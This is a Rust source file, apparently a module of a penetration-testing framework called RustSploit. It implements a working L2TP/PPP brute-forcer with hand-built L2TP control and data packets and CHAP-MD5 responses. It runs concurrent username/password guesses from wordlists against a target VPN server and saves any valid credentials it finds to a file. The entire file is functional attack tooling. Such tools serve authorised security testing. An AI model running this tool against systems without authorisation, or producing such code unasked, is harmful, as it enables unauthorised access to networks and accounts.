use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::Write,
    net::UdpSocket,
    sync::Arc,
    sync::atomic::{AtomicBool, Ordering},
    time::Duration,
};
use tokio::sync::{Mutex, Semaphore};
use tokio::time::sleep;

use crate::utils::{
    prompt_yes_no, prompt_wordlist, prompt_default, prompt_int_range,
    load_lines, normalize_target, get_filename_in_current_dir, prompt_port,
};
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 2;
const DEFAULT_TIMEOUT_MS: u64 = 5000;

// L2TP Message Types
const L2TP_SCCRQ: u16 = 1;   // Start-Control-Connection-Request
const L2TP_SCCRP: u16 = 2;   // Start-Control-Connection-Reply
const L2TP_SCCCN: u16 = 3;   // Start-Control-Connection-Connected
const L2TP_ICRQ: u16 = 10;   // Incoming-Call-Request
const L2TP_ICRP: u16 = 11;   // Incoming-Call-Reply
const L2TP_ICCN: u16 = 12;   // Incoming-Call-Connected

// PPP Protocol IDs
const PPP_CHAP: u16 = 0xC223;

// CHAP Codes
const CHAP_CHALLENGE: u8 = 1;
const CHAP_RESPONSE: u8 = 2;
const CHAP_SUCCESS: u8 = 3;
const CHAP_FAILURE: u8 = 4;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   L2TP/PPP Brute Force Module                             ║".cyan());
    println!("{}", "║   Native L2TP/CHAP Implementation                         ║".cyan());
    println!("{}", "║   Tests against L2TP servers using CHAP authentication    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// L2TP Session state
struct L2tpSession {
    sock: UdpSocket,
    local_tunnel_id: u16,
    remote_tunnel_id: u16,
    local_session_id: u16,
    remote_session_id: u16,
    ns: u16,  // Next sequence to send
    nr: u16,  // Next sequence expected
}

impl L2tpSession {
    fn new(sock: UdpSocket) -> Self {
        Self {
            sock,
            local_tunnel_id: rand::random::<u16>() | 1,
            remote_tunnel_id: 0,
            local_session_id: rand::random::<u16>() | 1,
            remote_session_id: 0,
            ns: 0,
            nr: 0,
        }
    }
    
    /// Build L2TP control message
    fn build_control(&mut self, avps: &[u8]) -> Vec<u8> {
        // Flags: T=1 (control), L=1 (length), S=1 (sequence)
        let flags: u16 = 0xC802;
        let length = 12 + avps.len() as u16;
        
        let mut pkt = Vec::with_capacity(length as usize);
        pkt.extend_from_slice(&flags.to_be_bytes());
        pkt.extend_from_slice(&length.to_be_bytes());
        pkt.extend_from_slice(&self.remote_tunnel_id.to_be_bytes());
        pkt.extend_from_slice(&0u16.to_be_bytes()); // Session 0 for control
        pkt.extend_from_slice(&self.ns.to_be_bytes());
        pkt.extend_from_slice(&self.nr.to_be_bytes());
        pkt.extend_from_slice(avps);
        
        self.ns = self.ns.wrapping_add(1);
        pkt
    }
    
    /// Build L2TP data message
    fn build_data(&self, payload: &[u8]) -> Vec<u8> {
        let flags: u16 = 0x0002; // Data message
        
        let mut pkt = Vec::with_capacity(6 + payload.len());
        pkt.extend_from_slice(&flags.to_be_bytes());
        pkt.extend_from_slice(&self.remote_tunnel_id.to_be_bytes());
        pkt.extend_from_slice(&self.remote_session_id.to_be_bytes());
        pkt.extend_from_slice(payload);
        pkt
    }
    
    /// Build AVP (Attribute-Value Pair)
    fn build_avp(attr_type: u16, value: &[u8], mandatory: bool) -> Vec<u8> {
        let flags = if mandatory { 0x8000 } else { 0 } | (6 + value.len() as u16);
        let mut avp = Vec::with_capacity(6 + value.len());
        avp.extend_from_slice(&flags.to_be_bytes());
        avp.extend_from_slice(&0u16.to_be_bytes()); // Vendor ID = 0
        avp.extend_from_slice(&attr_type.to_be_bytes());
        avp.extend_from_slice(value);
        avp
    }
    
    /// Send SCCRQ (Start-Control-Connection-Request)
    fn send_sccrq(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        // Message Type = SCCRQ
        avps.extend(Self::build_avp(0, &L2TP_SCCRQ.to_be_bytes(), true));
        // Protocol Version = 1.0
        avps.extend(Self::build_avp(2, &[0x01, 0x00], true));
        // Host Name
        avps.extend(Self::build_avp(3, b"RustSploit-L2TP", true));
        // Assigned Tunnel ID
        avps.extend(Self::build_avp(9, &self.local_tunnel_id.to_be_bytes(), true));
        // Receive Window Size
        avps.extend(Self::build_avp(10, &1500u16.to_be_bytes(), true));
        
        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }
    
    /// Send SCCCN (Start-Control-Connection-Connected)
    fn send_scccn(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        avps.extend(Self::build_avp(0, &L2TP_SCCCN.to_be_bytes(), true));
        
        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }
    
    /// Send ICRQ (Incoming-Call-Request)
    fn send_icrq(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        avps.extend(Self::build_avp(0, &L2TP_ICRQ.to_be_bytes(), true));
        avps.extend(Self::build_avp(14, &self.local_session_id.to_be_bytes(), true));
        avps.extend(Self::build_avp(15, &rand::random::<u32>().to_be_bytes(), true)); // Call Serial Number
        
        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }
    
    /// Send ICCN (Incoming-Call-Connected)
    fn send_iccn(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        avps.extend(Self::build_avp(0, &L2TP_ICCN.to_be_bytes(), true));
        avps.extend(Self::build_avp(24, &1000000u32.to_be_bytes(), true)); // Tx Connect Speed
        avps.extend(Self::build_avp(19, &0u32.to_be_bytes(), true)); // Framing Type
        
        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }
    
    /// Send CHAP Response
    fn send_chap_response(&self, identifier: u8, challenge: &[u8], username: &str, password: &str) -> Result<()> {
        // Compute CHAP hash: MD5(identifier + password + challenge)
        let mut data = Vec::with_capacity(1 + password.len() + challenge.len());
        data.push(identifier);
        data.extend_from_slice(password.as_bytes());
        data.extend_from_slice(challenge);
        let hash = md5::compute(&data);
        
        // Build CHAP Response packet
        let name_bytes = username.as_bytes();
        let length: u16 = 4 + 1 + 16 + name_bytes.len() as u16;
        
        let mut chap = Vec::new();
        chap.push(CHAP_RESPONSE);
        chap.push(identifier);
        chap.extend_from_slice(&length.to_be_bytes());
        chap.push(16); // Value size (MD5 = 16 bytes)
        chap.extend_from_slice(&hash.0);
        chap.extend_from_slice(name_bytes);
        
        // Wrap in PPP frame
        let mut ppp = Vec::new();
        ppp.extend_from_slice(&[0xFF, 0x03]); // Address + Control
        ppp.extend_from_slice(&PPP_CHAP.to_be_bytes());
        ppp.extend_from_slice(&chap);
        
        let pkt = self.build_data(&ppp);
        self.sock.send(&pkt)?;
        Ok(())
    }
    
    /// Receive and parse L2TP packet
    fn recv_packet(&self, timeout: Duration) -> Result<L2tpPacket> {
        self.sock.set_read_timeout(Some(timeout))?;
        
        let mut buf = [0u8; 4096];
        let n = self.sock.recv(&mut buf)?;
        
        if n < 6 {
            return Err(anyhow!("Packet too short"));
        }
        
        let flags = u16::from_be_bytes([buf[0], buf[1]]);
        let is_control = (flags & 0x8000) != 0;
        let has_length = (flags & 0x4000) != 0;
        let has_sequence = (flags & 0x0800) != 0;
        
        let mut offset = 2;
        
        if has_length {
            offset += 2;
        }
        
        let tunnel_id = u16::from_be_bytes([buf[offset], buf[offset + 1]]);
        offset += 2;
        let session_id = u16::from_be_bytes([buf[offset], buf[offset + 1]]);
        offset += 2;
        
        if has_sequence {
            offset += 4; // Ns + Nr
        }
        
        let payload = buf[offset..n].to_vec();
        
        Ok(L2tpPacket {
            is_control,
            tunnel_id,
            session_id,
            payload,
        })
    }
    
    /// Parse control message type from AVPs
    fn parse_message_type(payload: &[u8]) -> Option<u16> {
        let mut offset = 0;
        while offset + 6 <= payload.len() {
            let avp_flags = u16::from_be_bytes([payload[offset], payload[offset + 1]]);
            let avp_len = (avp_flags & 0x03FF) as usize;
            
            if offset + avp_len > payload.len() {
                break;
            }
            
            let vendor_id = u16::from_be_bytes([payload[offset + 2], payload[offset + 3]]);
            let attr_type = u16::from_be_bytes([payload[offset + 4], payload[offset + 5]]);
            
            if vendor_id == 0 && attr_type == 0 && avp_len >= 8 {
                return Some(u16::from_be_bytes([payload[offset + 6], payload[offset + 7]]));
            }
            
            offset += avp_len;
        }
        None
    }
    
    /// Parse assigned tunnel/session ID from AVPs
    fn parse_assigned_id(payload: &[u8], attr_type: u16) -> Option<u16> {
        let mut offset = 0;
        while offset + 6 <= payload.len() {
            let avp_flags = u16::from_be_bytes([payload[offset], payload[offset + 1]]);
            let avp_len = (avp_flags & 0x03FF) as usize;
            
            if offset + avp_len > payload.len() {
                break;
            }
            
            let vendor_id = u16::from_be_bytes([payload[offset + 2], payload[offset + 3]]);
            let avp_type = u16::from_be_bytes([payload[offset + 4], payload[offset + 5]]);
            
            if vendor_id == 0 && avp_type == attr_type && avp_len >= 8 {
                return Some(u16::from_be_bytes([payload[offset + 6], payload[offset + 7]]));
            }
            
            offset += avp_len;
        }
        None
    }
}

#[allow(dead_code)]
struct L2tpPacket {
    is_control: bool,
    tunnel_id: u16,
    session_id: u16,
    payload: Vec<u8>,
}

/// Main L2TP bruteforce entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let normalized = normalize_target(target)?;
    let port: u16 = prompt_port("L2TP Port", 1701)?;
    
    let usernames_file = prompt_wordlist("Username wordlist")?;
    let passwords_file = prompt_wordlist("Password wordlist")?;
    
    let concurrency = prompt_int_range("Max concurrent tasks", 10, 1, 100)? as usize;
    let timeout_ms = prompt_int_range("Connection timeout (ms)", DEFAULT_TIMEOUT_MS as i64, 100, 30000)? as u64;
    
    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file name", "l2tp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false)?;

    let addr = format!("{}:{}", normalized, port);
    
    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        return Err(anyhow!("Username wordlist is empty"));
    }
    println!("[*] Loaded {} usernames", users.len());
    
    let passwords = load_lines(&passwords_file)?;
    if passwords.is_empty() {
        return Err(anyhow!("Password wordlist is empty"));
    }
    println!("[*] Loaded {} passwords", passwords.len());
    
    let total_attempts = if combo_mode { 
        users.len() * passwords.len() 
    } else { 
        std::cmp::max(users.len(), passwords.len()) 
    };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    
    // Test connectivity first
    println!("\n[*] Testing L2TP server connectivity...");
    match test_l2tp_connectivity(&addr, Duration::from_millis(timeout_ms)).await {
        Ok(true) => println!("[+] L2TP server is responding"),
        Ok(false) => println!("{}", "[!] L2TP server not responding to control messages".yellow()),
        Err(e) => println!("{}", format!("[!] Connectivity test failed: {}", e).yellow()),
    }
    
    println!("\n{}", "[Starting Attack]".bold().yellow());
    println!();
    
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());
    let timeout_duration = Duration::from_millis(timeout_ms);
    
    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
            stats_clone.print_progress();
        }
    });
    
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks = FuturesUnordered::new();
    
    // Generate credential combinations
    let combos: Vec<(String, String)> = if combo_mode {
        users.iter()
            .flat_map(|u| passwords.iter().map(move |p| (u.clone(), p.clone())))
            .collect()
    } else {
        let max_len = std::cmp::max(users.len(), passwords.len());
        (0..max_len)
            .map(|i| (users[i % users.len()].clone(), passwords[i % passwords.len()].clone()))
            .collect()
    };
    
    for (user, pass) in combos {
        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
        }
        
        let permit = match semaphore.clone().acquire_owned().await {
            Ok(p) => p,
            Err(_) => break,
        };
        
        let addr_clone = addr.clone();
        let found_clone = found_credentials.clone();
        let stop_clone = stop_signal.clone();
        let stats_clone = stats.clone();
        
        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            
            if stop_on_success && stop_clone.load(Ordering::Relaxed) {
                return;
            }
            
            match try_l2tp_login(&addr_clone, &user, &pass, timeout_duration).await {
                Ok(true) => {
                    println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass).green().bold());
                    found_clone.lock().await.push((addr_clone.clone(), user.clone(), pass.clone()));
                    stats_clone.record_success();
                    if stop_on_success {
                        stop_clone.store(true, Ordering::Relaxed);
                    }
                }
                Ok(false) => {
                    stats_clone.record_failure();
                    if verbose {
                        println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass).dimmed());
                    }
                }
                Err(e) => {
                    stats_clone.record_error(e.to_string()).await;
                    if verbose {
                        println!("\r{}", format!("[!] {}: {}", addr_clone, e).red());
                    }
                }
            }
        }));
        
        // Drain completed tasks periodically
        while tasks.len() >= concurrency * 2 {
            if let Some(_) = tasks.next().await {}
        }
    }
    
    // Wait for remaining tasks
    while let Some(_) = tasks.next().await {}
    
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    stats.print_final().await;
    
    // Save results
    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host_addr, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host_addr, user, pass);
        }
        
        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            if let Ok(mut file) = File::create(&filename) {
                for (host_addr, user, pass) in creds.iter() {
                    let _ = writeln!(file, "{} -> {}:{}", host_addr, user, pass);
                }
                println!("[+] Results saved to '{}'", filename.display());
            }
        }
    }
    
    Ok(())
}

/// Test L2TP server connectivity
async fn test_l2tp_connectivity(addr: &str, timeout: Duration) -> Result<bool> {
    let result = tokio::task::spawn_blocking({
        let addr = addr.to_string();
        move || -> Result<bool> {
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            sock.connect(&addr)?;
            sock.set_read_timeout(Some(timeout))?;
            sock.set_write_timeout(Some(timeout))?;
            
            let mut session = L2tpSession::new(sock);
            session.send_sccrq()?;
            
            match session.recv_packet(timeout) {
                Ok(pkt) => {
                    if pkt.is_control {
                        if let Some(msg_type) = L2tpSession::parse_message_type(&pkt.payload) {
                            return Ok(msg_type == L2TP_SCCRP);
                        }
                    }
                    Ok(false)
                }
                Err(_) => Ok(false),
            }
        }
    }).await?;
    result
}

/// Attempt L2TP login with credentials
async fn try_l2tp_login(addr: &str, username: &str, password: &str, timeout: Duration) -> Result<bool> {
    let addr = addr.to_string();
    let username = username.to_string();
    let password = password.to_string();
    
    tokio::task::spawn_blocking(move || {
        try_l2tp_login_sync(&addr, &username, &password, timeout)
    }).await?
}

/// Synchronous L2TP login attempt
fn try_l2tp_login_sync(addr: &str, username: &str, password: &str, timeout: Duration) -> Result<bool> {
    let sock = UdpSocket::bind("0.0.0.0:0")?;
    sock.connect(addr)?;
    sock.set_read_timeout(Some(timeout))?;
    sock.set_write_timeout(Some(timeout))?;
    
    let mut session = L2tpSession::new(sock);
    
    // Step 1: Send SCCRQ
    session.send_sccrq()?;
    
    // Step 2: Receive SCCRP
    let pkt = session.recv_packet(timeout)?;
    if !pkt.is_control {
        return Err(anyhow!("Expected control message, got data"));
    }
    
    match L2tpSession::parse_message_type(&pkt.payload) {
        Some(L2TP_SCCRP) => {
            if let Some(tid) = L2tpSession::parse_assigned_id(&pkt.payload, 9) {
                session.remote_tunnel_id = tid;
            }
            session.nr += 1;
        }
        Some(other) => return Err(anyhow!("Expected SCCRP, got message type {}", other)),
        None => return Err(anyhow!("No message type in response")),
    }
    
    // Step 3: Send SCCCN
    session.send_scccn()?;
    
    // Step 4: Send ICRQ
    session.send_icrq()?;
    
    // Step 5: Receive ICRP
    let pkt = session.recv_packet(timeout)?;
    if pkt.is_control {
        if let Some(L2TP_ICRP) = L2tpSession::parse_message_type(&pkt.payload) {
            if let Some(sid) = L2tpSession::parse_assigned_id(&pkt.payload, 14) {
                session.remote_session_id = sid;
            }
            session.nr += 1;
        }
    }
    
    // Step 6: Send ICCN
    session.send_iccn()?;
    
    // Step 7: Wait for CHAP Challenge
    let mut challenge_data: Option<(u8, Vec<u8>)> = None;
    
    for _ in 0..5 {
        match session.recv_packet(timeout) {
            Ok(pkt) => {
                if !pkt.is_control && pkt.payload.len() > 6 {
                    // Check for PPP CHAP
                    let mut offset = 0;
                    if pkt.payload[0] == 0xFF && pkt.payload[1] == 0x03 {
                        offset = 2;
                    }
                    
                    if pkt.payload.len() > offset + 4 {
                        let protocol = u16::from_be_bytes([pkt.payload[offset], pkt.payload[offset + 1]]);
                        if protocol == PPP_CHAP {
                            let chap_code = pkt.payload[offset + 2];
                            if chap_code == CHAP_CHALLENGE {
                                let identifier = pkt.payload[offset + 3];
                                let value_size = pkt.payload[offset + 6] as usize;
                                if pkt.payload.len() >= offset + 7 + value_size {
                                    let challenge = pkt.payload[offset + 7..offset + 7 + value_size].to_vec();
                                    challenge_data = Some((identifier, challenge));
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            Err(_) => break,
        }
    }
    
    let (identifier, challenge) = challenge_data.ok_or_else(|| anyhow!("No CHAP challenge received"))?;
    
    // Step 8: Send CHAP Response
    session.send_chap_response(identifier, &challenge, username, password)?;
    
    // Step 9: Wait for CHAP Success/Failure
    for _ in 0..5 {
        match session.recv_packet(timeout) {
            Ok(pkt) => {
                if !pkt.is_control && pkt.payload.len() > 4 {
                    let mut offset = 0;
                    if pkt.payload[0] == 0xFF && pkt.payload[1] == 0x03 {
                        offset = 2;
                    }
                    
                    if pkt.payload.len() > offset + 2 {
                        let protocol = u16::from_be_bytes([pkt.payload[offset], pkt.payload[offset + 1]]);
                        if protocol == PPP_CHAP {
                            let chap_code = pkt.payload[offset + 2];
                            match chap_code {
                                CHAP_SUCCESS => return Ok(true),
                                CHAP_FAILURE => return Ok(false),
                                _ => continue,
                            }
                        }
                    }
                }
            }
            Err(_) => break,
        }
    }
    
    Err(anyhow!("No CHAP response received"))
}
